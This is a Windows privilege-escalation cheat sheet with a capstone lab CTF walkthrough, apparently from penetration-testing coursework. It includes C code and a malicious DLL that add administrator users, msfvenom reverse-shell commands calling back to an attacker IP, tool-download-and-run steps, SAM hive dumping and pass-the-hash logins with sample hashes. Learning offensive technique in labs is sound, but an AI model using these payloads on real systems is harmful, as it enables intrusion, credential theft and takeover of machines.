# Information Gathering

## Installed applications
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```



## Find the path of a running process


https://superuser.com/questions/768984/show-exe-file-path-of-running-processes-on-the-command-line-in-windows
```

PS C:\Users\mac> Get-Process NonStandardProcess

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     79       8    11912       1608       6.14   1792   0 NonStandardProcess


PS C:\Users\mac> Get-Process NonStandardProcess | Format-List Path


Path : C:\Users\mac\AppData\Roaming\SuperCompany\NonStandardProcess.exe



PS C:\Users\mac> cd C:\Users\mac\AppData\Roaming\SuperCompany
PS C:\Users\mac\AppData\Roaming\SuperCompany> dir


    Directory: C:\Users\mac\AppData\Roaming\SuperCompany


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/16/2026  12:22 PM             38 flag.txt
-a----        11/15/2022   8:32 AM        1323008 NonStandardProcess.exe


PS C:\Users\mac\AppData\Roaming\SuperCompany> type flag.txt
OS{dbf6f787909a715d9d1a4767fc7a2a89}
PS C:\Users\mac\AppData\Roaming\SuperCompany>

```

Get noteworthy files:
`Get-ChildItem -Path C:\Users\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue` 

Get flag file:
`Get-ChildItem -Path C:\Users\ -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue` 

## Find Powershell History
```powershell
Get-History
```
If not cleared this will output last commands executed in the current PowerShell session. To find the history of commands executed in previous sessions, you can check the PowerShell history file, which is typically located at:
```powershell
(Get-PSReadlineOption).HistorySavePath
```

Wich you can read with:
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
```

### Creds in PowerShell History
If you find any credentials in the PowerShell history, you can use them to escalate privileges
Example what you'll find in the history:

```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

This is also called powershell remoting, which allows you to run commands on a remote machine. If you have the credentials, you can use them to access the remote machine and potentially escalate privileges.

Linux tool for it is called `evil-winrm`, which allows you to connect to a Windows machine using the WinRM protocol. You can use it to execute commands on the remote machine and potentially escalate privileges if you have valid credentials.
```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

## Windows Enumeration WinPEAS
WinPEAS is a script that enumerates common Windows privilege escalation vectors. It can be run on a Windows machine to gather information about the system, installed software, services, and potential misconfigurations that could be exploited for privilege escalation.
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

### Copy it to your target machine and run it:
```powershell
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
```
```powershell
.\winPEAS.exe
```

WinPeas will output a lot of information, including potential privilege escalation vectors, such as weak permissions, unquoted service paths, and more.

Other options for Windows enumeration include
PowerUp, but it is not maintained anymore. You can find it here:
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

## Privesc Windows
Use PowerUp to find potential privilege escalation vectors on Windows systems. 

```powershell
iwr -uri https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Privesc/PowerUp.ps1 -Outfile PowerUp.ps1
```
Import the PowerUp module and run the enumeration functions to identify misconfigurations and vulnerabilities that could be exploited for privilege escalation.

```powershell
. .\PowerUp.ps1
```
Get a list of all services and their properties, including the binary path, to identify potential misconfigurations.
```powershell
Get-ModifiableServiceFile    
```
PowerUp will also suggest potential privilege escalation vectors based on the findings.
```powershell
Install-ServiceBinary -Name LaDEEDah
```

### Replace the binary of a service with a malicious one to escalate privileges. 
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
Compile it with:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Then you can copy the binary to the target machine and replace the binary of a service with it. When the service is restarted, it will execute your malicious binary, adding a new user with administrative privileges.
```powershell
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
Try to stop the service and start it again to trigger the execution of your malicious binary.
```powershell
net stop mysql
net start mysql
```
If you cant stop the service, you can try to restart the machine to trigger the execution of your malicious binary.
```powershell
shutdown /r /t 0
```

## Run application as a specific user using `runas` command
The `runas` command allows you to run a program as a different user. 

```powershell
runas /user:Administrator "C:\Path\To\Application.exe"
```

## DLL Hijacking
Thanks to DLL Searchorder you can hijack a DLL that is loaded by a program. If you can place a malicious DLL in the same directory as the executable, it will be loaded instead of the legitimate one.

Oder of searching for DLLs in Windows:
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

Windows first searches the application's directory. Interestingly, the current directory is at position 5. When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.

### Create dll to add a user
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Compile it with:
```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```
Or get a reverse shell dll from `msfvenom`:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f dll > EnterpriseServiceOptional.dll
```

Then restart the service to trigger the execution.

## Unqouted Service Path
Unquoted service paths can be exploited to escalate privileges. If a service has an unquoted path and the path contains spaces, an attacker can place a malicious executable in a location that will be executed when the service starts. For example, if a service has the path `C:\Program Files\My Service\service.exe`, an attacker can place a malicious executable at `C:\Program.exe`

Find them using the following command:
```bat
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
The `findstr` filters out services that do not have quotes in their path and also filters out services that are located in the Windows directory, we we wont have write permissions there.


In powershell you can use the following command to find unquoted service paths:
```powershell
Get-WmiObject win32_service | Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '"' } | Select-Object Name, PathName
``` 
Check if you can start top a services
```powershell
Get-Service -Name "ServiceName" | Stop-Service
Get-Service -Name "ServiceName" | Start-Service
```


Use `icacls` to check if you have write permissions to the directory of the service path. 
```powershell
PS C:\Users\steve> icacls "C:\"
C:\ S-1-15-3-65536-1888954469-739942743-1668119174-2468466756-4239452838-1296943325-355587736-700089176:(S,RD,X,RA)
    BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)

Successfully processed 1 files; Failed processing 0 files
PS C:\Users\steve> icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

Now write a malicious executable to the directory, for example to `C:\` and Name it `Program.exe`. When the service is started, it will execute your malicious executable instead of the legitimate one, allowing you to escalate privileges.


Usefull automated tool: PowerUp
```powershell
iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```
It will suggest which service you can exploit to escalate privileges. 
Then run and restart the service
```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
```

`PowerUp` will default to the user john and the password `Password123!` to escalate privileges.

## Scheduling Tasks
Run `schtasks /query /fo LIST /v` or in Powershell `Get-ScheduledTask | Select-Object TaskName, TaskPath, State, Actions` to list all scheduled tasks.
Bit of a mess to filter through, as there are a lot of scheduled tasks that are not relevant. Filter the working directory or location of the executable to a location that you have write permissions to.
`Get-ScheduledTask | Where-Object {$_.Actions.Execute -like "*C:\Users\*"} | Select-Object TaskName, TaskPath, State, Actions`
and 
`Get-ScheduledTask | Where-Object {$_.Actions.Execute -like "*C:\Program Files\*"} | Select-Object TaskName, TaskPath, State, Actions`
Executable files in a dir that you have write permissions
`Get-ScheduledTask | Where-Object {$_.Actions.Execute -like "*C:\Users\*"} | Select-Object TaskName, TaskPath, State, Actions | ForEach-Object { $_.Actions.Execute } | ForEach-Object { Get-Item $_ } | Where-Object { $_.PSIsContainer -eq $false } | Select-Object FullName`

# Capstone CTF Windows Privilege Escalation

We start with a shell of user Diana via port 4444.
Connect using 
```bash
nc <IP_ADDRESS> 4444
```

We find some notes in the home dir of Diana, where we find the password of alex.
I tried connecting using WinRM
```bash
evil-winrm -i 192.168.107.222 -u alex -p 'WelcomeToWinter0121'
```

Using WinPEAS we found some interesting things:
    Enterprise Service Checks(Enterprise Service Checks)["C:\Services\EnterpriseService.exe"] - Autoload
    Possible DLL Hijacking in binary folder: C:\Services (Authenticated Users [Allow: WriteData/CreateFiles])

Checking the permissions of the folder `C:\Services` we see that we have write permissions to it (`icacls C:\Services`). So we can place a malicious DLL in that folder and when the service is restarted, it will execute our malicious DLL.

To figure out which dll we would normally use process explorer, but we can't run that as we are not admin yet.
We could work around this by installing the service locally on a VM, but luckily there is some logging.

```ps1

PS C:\Services> dir
dir


    Directory: C:\Services


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-ar---         9/14/2022   8:49 AM         251392 EnterpriseService.exe                                                
-a----         10/8/2026   8:10 AM              0 EnterpriseServiceLog.log       
```

We find that we can add a dll called `EnterpriseServiceOptional.dll` to the folder and when the service is restarted, it will execute our malicious dll.

We can use msfvenom to create a shell dll:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f dll > EnterpriseServiceOptional.dll
```

But somehow I can't do everything I want in there like starting and stopping services to get it to load the dll. So I will try to connect using RDP to the machine and do it from there.

```bash
xfreerdp /u:'alex' /p:'WelcomeToWinter0121' /v:192.168.107.222 /dynamic-resolution
```

Sometimes the rdp session wont load everyting so I can close the connection using winrm:
```ps1
*Evil-WinRM* PS C:\Users\alex\Documents> qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console                                     1  Conn
 rdp-tcp#0         alex                      2  Active
 rdp-tcp                                 65536  Listen
*Evil-WinRM* PS C:\Users\alex\Documents> rwinsta 2
```

We go to `services.msc` and restart the service `EnterpriseService`. This will trigger the execution of our malicious dll and we get a shell as `enterpriseuser`. The last step is to elevate to `enterpriseadmin` using one of the potato exploits. 

```bash
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.162] from (UNKNOWN) [192.168.138.222] 51017
Microsoft Windows [Version 10.0.22000.978]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeBackupPrivilege             Back up files and directories             Disabled
SeRestorePrivilege            Restore files and directories             Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

As `SeImpersonatePrivilege` is enabled my first tought was to use one of the Potato exploits like SigmaPotato, but I can't get it to work. 

I can make use of the SeBackupPrivilege and SeRestorePrivilege to copy the SAM and SYSTEM files to my home dir 

```cmd
C:\Services>reg save HKLM\SAM C:\Services\sam.hiv
reg save HKLM\SAM C:\Services\sam.hiv
The operation completed successfully.

C:\Services>reg save HKLM\SYSTEM C:\Services\system.hiv
reg save HKLM\SYSTEM C:\Services\system.hiv
The operation completed successfully.
```

I copied them locally using the alex rdp session with my drive mapped `xfreerdp /u:'alex' /p:'WelcomeToWinter0121' /v:192.168.138.222 /dynamic-resolution /drive:konijn,.`

Then impacket-secretsdump can be used to extract the hashes from the SAM and SYSTEM files. 

```bash
]
└─$ impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL

\
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xb4999e49259682622dcc1e3a1636ff45
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:856f13362db36284f7d964120d794a98:::
enterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::
diana:1002:aad3b435b51404eeaad3b435b51404ee:3f2e7dddbe7a42d8978c1689b67297f3:::
alex:1003:aad3b435b51404eeaad3b435b51404ee:821036ef8b6f43194779f6fca426f3f7:::
enterpriseuser:1004:aad3b435b51404eeaad3b435b51404ee:b875ee792421982ebcfa8217340ef376:::
offsec:1005:aad3b435b51404eeaad3b435b51404ee:d2ce08a1ee362158863d47d478b2622e:::
cloudbase-init:1006:aad3b435b51404eeaad3b435b51404ee:ea9fb7c4d704d9520d1f6d535ce0f523:::
Admin:1007:aad3b435b51404eeaad3b435b51404ee:c3f47c55dcdfcb043d099446ca11e07c:::
[*] Cleaning up... 
```

Using the hash with evil-winrm we can connect to the machine as `enterpriseadmin` or `Administrator` and get the root flag. 

```bash
evil-winrm -i 192.168.138.222 -u Administrator -H 8f518eb35353d7a83d27e7fe457664e5
```
```cmd
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\enterpriseadmin\Desktop
*Evil-WinRM* PS C:\Users\enterpriseadmin\Desktop> dir


    Directory: C:\Users\enterpriseadmin\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/12/2026   2:10 PM             38 flag.txt
-a----         9/15/2022  10:04 PM           2350 Microsoft Edge.lnk


*Evil-WinRM* PS C:\Users\enterpriseadmin\desktop> type flag.txt
OS{fb0378e0b6ef52d595f5fac53ff0081d}

```

